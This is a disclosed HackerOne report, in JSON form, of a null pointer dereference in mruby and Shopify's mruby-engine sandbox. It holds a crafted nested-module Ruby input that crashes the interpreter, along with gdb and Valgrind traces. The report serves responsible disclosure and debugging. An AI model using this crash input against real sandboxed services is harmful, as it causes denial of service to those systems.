{
  "id": 212107,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMTIxMDc=",
  "url": "https://hackerone.com/reports/212107",
  "title": "Null pointer dereference in mrb_class",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "low",
  "readable_substate": "Resolved",
  "created_at": "2017-03-10T00:58:59.157Z",
  "submitted_at": "2017-03-10T00:58:59.157Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "dgaletic",
    "url": "/dgaletic",
    "profile_picture_urls": {
      "small": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 15668,
    "url": "https://hackerone.com/shopify-scripts",
    "handle": "shopify-scripts",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
    },
    "permissions": [],
    "submission_state": "paused",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "shopify-scripts",
      "twitter_handle": "",
      "website": "",
      "about": ""
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2017-03-14T21:12:28.984Z",
  "bug_reporter_agreed_on_going_public_at": "2017-03-14T21:12:28.948Z",
  "team_member_agreed_on_going_public_at": "2017-03-14T21:11:17.091Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "The following code demonstrates a segfault in mruby and mruby-engine:\n\n    module A module A\n    ensure\n        module A module A module A module A\n        ensure\n            module A module A module A module A module A module A\n               a \n            ensure\n                module A\n                    yield\n                end\n            end end end end end end\n        end end end end\n    end end\n\nThe mruby crash is due to a null pointer dereference in `mrb_class` (class.h:50):\n\n    49│   default:\n    50├>    return mrb_obj_ptr(v)->c;\n    51│   }\n\n(gdb) print mrb_obj_ptr(v)\n$1 = (struct RObject *) 0x0\n(gdb) print v\n$2 = {value = {f = 0, p = 0x0, i = 0, sym = 0}, tt = 49}\n\nThe sandbox crash happens during a call to KHASH_DEFINE (class.c:19). Examining the assembly suggests the crash happens when trying to dereference the rsi register:\n\n(gdb) x/i $rip\n=> 0x7ffff402f490 <kh_get_mt>:  mov    eax,DWORD PTR [rsi]\n(gdb) p $rsi\n$4 = 32\n\nExamining mruby with Valgrind shows two invalid reads on the following line (vm.c:1867):\n\n    if (mrb_nil_p(stack[m1+r+m2])) {\n    \nValgrind output:\n\n    ==11371== Invalid read of size 4\n    ==11371==    at 0x41FCEB: mrb_vm_exec (vm.c:1867)\n    ==11371==    by 0x41B684: mrb_vm_run (vm.c:822)\n    ==11371==    by 0x42386C: mrb_run (vm.c:2570)\n    ==11371==    by 0x419D40: ecall (vm.c:314)\n    ==11371==    by 0x41EEF2: mrb_vm_exec (vm.c:1651)\n    ==11371==    by 0x41B684: mrb_vm_run (vm.c:822)\n    ==11371==    by 0x42386C: mrb_run (vm.c:2570)\n    ==11371==    by 0x419D40: ecall (vm.c:314)\n    ==11371==    by 0x41CAD1: mrb_vm_exec (vm.c:1132)\n    ==11371==    by 0x41B684: mrb_vm_run (vm.c:822)\n    ==11371==    by 0x42386C: mrb_run (vm.c:2570)\n    ==11371==    by 0x419D40: ecall (vm.c:314)\n    ==11371==  Address 0x56271f8 is 8 bytes after a block of size 16 alloc'd\n    ==11371==    at 0x4C2AB80: malloc (in /usr/lib/valgrind/vgpreload_memcheck-amd64-linux.so)\n    ==11371==    by 0x4C2CF1F: realloc (in /usr/lib/valgrind/vgpreload_memcheck-amd64-linux.so)\n    ==11371==    by 0x40F300: mrb_default_allocf (state.c:60)\n    ==11371==    by 0x428156: mrb_realloc_simple (gc.c:201)\n    ==11371==    by 0x4281D8: mrb_realloc (gc.c:215)\n    ==11371==    by 0x4282A4: mrb_malloc (gc.c:236)\n    ==11371==    by 0x419A8A: mrb_env_unshare (vm.c:259)\n    ==11371==    by 0x419B33: cipop (vm.c:278)\n    ==11371==    by 0x41ED8E: mrb_vm_exec (vm.c:1624)\n    ==11371==    by 0x41B684: mrb_vm_run (vm.c:822)\n    ==11371==    by 0x42386C: mrb_run (vm.c:2570)\n    ==11371==    by 0x419D40: ecall (vm.c:314)\n    ==11371== \n    ==11371== Invalid read of size 4\n    ==11371==    at 0x41FD1B: mrb_vm_exec (vm.c:1867)\n    ==11371==    by 0x41B684: mrb_vm_run (vm.c:822)\n    ==11371==    by 0x42386C: mrb_run (vm.c:2570)\n    ==11371==    by 0x419D40: ecall (vm.c:314)\n    ==11371==    by 0x41EEF2: mrb_vm_exec (vm.c:1651)\n    ==11371==    by 0x41B684: mrb_vm_run (vm.c:822)\n    ==11371==    by 0x42386C: mrb_run (vm.c:2570)\n    ==11371==    by 0x419D40: ecall (vm.c:314)\n    ==11371==    by 0x41CAD1: mrb_vm_exec (vm.c:1132)\n    ==11371==    by 0x41B684: mrb_vm_run (vm.c:822)\n    ==11371==    by 0x42386C: mrb_run (vm.c:2570)\n    ==11371==    by 0x419D40: ecall (vm.c:314)\n    ==11371==  Address 0x56271f0 is 0 bytes after a block of size 16 alloc'd\n    ==11371==    at 0x4C2AB80: malloc (in /usr/lib/valgrind/vgpreload_memcheck-amd64-linux.so)\n    ==11371==    by 0x4C2CF1F: realloc (in /usr/lib/valgrind/vgpreload_memcheck-amd64-linux.so)\n    ==11371==    by 0x40F300: mrb_default_allocf (state.c:60)\n    ==11371==    by 0x428156: mrb_realloc_simple (gc.c:201)\n    ==11371==    by 0x4281D8: mrb_realloc (gc.c:215)\n    ==11371==    by 0x4282A4: mrb_malloc (gc.c:236)\n    ==11371==    by 0x419A8A: mrb_env_unshare (vm.c:259)\n    ==11371==    by 0x419B33: cipop (vm.c:278)\n    ==11371==    by 0x41ED8E: mrb_vm_exec (vm.c:1624)\n    ==11371==    by 0x41B684: mrb_vm_run (vm.c:822)\n    ==11371==    by 0x42386C: mrb_run (vm.c:2570)\n    ==11371==    by 0x419D40: ecall (vm.c:314)\n    ==11371== \n    trace:\n\t    [15] crash_input:9\n\t    [14] crash_input:8\n\t    [12] crash_input:5\n\t    [11] crash_input:5\n\t    [10] crash_input:5\n\t    [9] crash_input:5\n\t    [8] crash_input:5\n\t    [6] crash_input:3\n\t    [5] crash_input:3\n\t    [4] crash_input:3\n\t    [3] crash_input:3\n\t    [1] crash_input:1\n\t    [0] crash_input:1\n    LocalJumpError: unexpected yield\n    ==11371== \n    ==11371== HEAP SUMMARY:\n    ==11371==     in use at exit: 0 bytes in 0 blocks\n    ==11371==   total heap usage: 4,735 allocs, 4,735 frees, 872,977 bytes allocated\n    ==11371== \n    ==11371== All heap blocks were freed -- no leaks are possible\n    ==11371== \n    ==11371== For counts of detected and suppressed errors, rerun with: -v\n    ==11371== ERROR SUMMARY: 2 errors from 2 contexts (suppressed: 0 from 0)\n\n    \nAs `m1`, `r` and `m2` are all 0 during the invalid reads, it seems `stack` is pointing beyond allocated memory. Note that running with Valgrind appears to change the behaviour of the program: it does not result in a segfault, raising a LocalJumpError instead.\n\nWe are still examining the bug and hope to provide a fix soon.\n\nTest platform:\nLinux Mint 17.3 (Cinnamon 64-bit), built with gcc version 4.8.4 (Ubuntu 4.8.4-2ubuntu1~14.04.3)\n\nmruby-engine SHA: 09be20e67888b20bebf9b0588bc3cbec7f55325f\nmruby/mruby submodule SHA: 63dbed00946afda34178a479cfa38fa78d620a00\n\nThank you,\nDinko Galetic\nDenis Kasak\n\n",
  "bounty_amount": "800.0",
  "formatted_bounty": "$800",
  "weakness": {
    "id": 48,
    "name": "Denial of Service"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2017-04-13T21:11:17.143Z",
  "allow_singular_disclosure_after": -215709932.7683199,
  "singular_disclosure_allowed": true,
  "vote_count": 2,
  "voters": [
    "eveeez",
    "spetr0x"
  ],
  "severity": {
    "rating": "low",
    "author_type": "User"
  },
  "structured_scope": null,
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
